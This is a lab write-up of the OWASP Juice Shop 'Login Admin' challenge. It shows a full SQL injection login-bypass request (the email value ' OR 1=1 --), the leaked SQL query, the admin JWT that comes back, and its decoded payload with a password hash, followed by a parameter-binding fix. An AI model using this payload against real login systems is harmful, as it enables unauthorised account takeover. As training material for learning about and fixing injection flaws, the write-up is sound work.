# Login Admin

Log in with the administrator's user account.

Style: Tutorial, Good for Demos, With Coding Challenge
Topic: Injection

## Solution

### Web Exploitation Part
Due to it being an an auth-bypass so the injection is probably at the login page...

Acording to burp it a  `/rest/user/login` endpoint, login via `POST` request with a json body (payload, keys are `email` and `password`).

First we try to start with `'--` inside the `password` value, didn't caused anything. Usually password goes trough hashing before being stored against DB so it makes sense...

Tried `' OR 1=1` at `email` value and received an `SQLITE-ERROR`. The error included a SQL query that was executed
```sql
SELECT * FROM Users WHERE email = '' OR 1=1 ' AND password = '74b87337454200d4d33f80c4663dc5e5' AND deletedAt IS NULL"
```
```sql
SELECT * FROM Users WHERE email = '<USER-INPUT>' AND password = '<PASSWORD-HASH>' AND deletedAt IS NULL"
```

So maybe commenting the reset of the query will work...

So the final request
```python
POST /rest/user/login HTTP/1.1
Host: 127.0.0.1:3000
...
Content-Type: application/json
...

{
    "email":"' OR 1=1 --",
    "password":"aaaa"
}
```

The resopnse was `200 OK` with a json that included a JWT

```json
{
    "authentication": {
        "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDYtMDYgMDk6MzE6MjkuNjMwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDYtMDYgMDk6MzE6MjkuNjMwICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc4MDc0NDQ3Mn0.lnrqT5qTbiZVQ2o2s3iGX_dnIm-b9sEmJbMyE9qZ-fZ4JfnxbaQ_aF9VcFJrGXGvvJTZ79uFFtMRjn3InhgrzWXixOcsfeM7y2L4CIowmQYrqIbRyb_r5mcPFS8YVUoZP613qAbwj_uOtTj0-kHmGy4V-1o-iL9M5CIAv0yFOjE",
        "bid": 1,
        "umail": "admin@juice-sh.op"
    }
}
```

The token type is `JWT`, here is it details...
```json
{
    "status": "success",
    "data": {
        "id": 1,
        "username": "",
        "email": "admin@juice-sh.op",
        "password": "0192023a7bbd73250516f069df18b500",
        "role": "admin",
        "deluxeToken": "",
        "lastLoginIp": "",
        "profileImage": "assets/public/images/uploads/defaultAdmin.png",
        "totpSecret": "",
        "isActive": true,
        "createdAt": "2026-06-06 09:31:29.630 +00:00",
        "updatedAt": "2026-06-06 09:31:29.630 +00:00",
        "deletedAt": null
    },
    "iat": 1780744472
}
```

### Coding Challenge

**Find It**
Line 15 is vulnerable: `models.sequelize.query...`

**Fix It**
Use in place arguments via `$<NUM>` and `bind` utility...